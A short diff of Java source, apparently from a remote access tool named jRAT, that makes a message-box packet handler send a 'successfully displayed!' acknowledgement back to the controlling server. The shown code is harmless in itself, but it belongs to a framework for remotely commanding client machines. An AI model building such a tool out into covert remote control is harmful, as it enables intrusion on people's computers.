@@ -2,7 +2,9 @@ package net.jrat.core.packet.server;
 
 import javax.swing.JOptionPane;
 
+import net.jrat.core.Client;
 import net.jrat.core.packet.IPacket;
+import net.jrat.core.packet.client.C1PacketMessage;
 
 public class S1PacketShowMessage implements IPacket
 {
@@ -16,5 +18,6 @@ public class S1PacketShowMessage implements IPacket
 	public void execute(Object object) throws Exception
 	{
 		JOptionPane.showMessageDialog(null, this.message, this.title, this.type);
+		Client.instance.outputStream.writeObject(new C1PacketMessage("successfully displayed!"));
 	}
 }
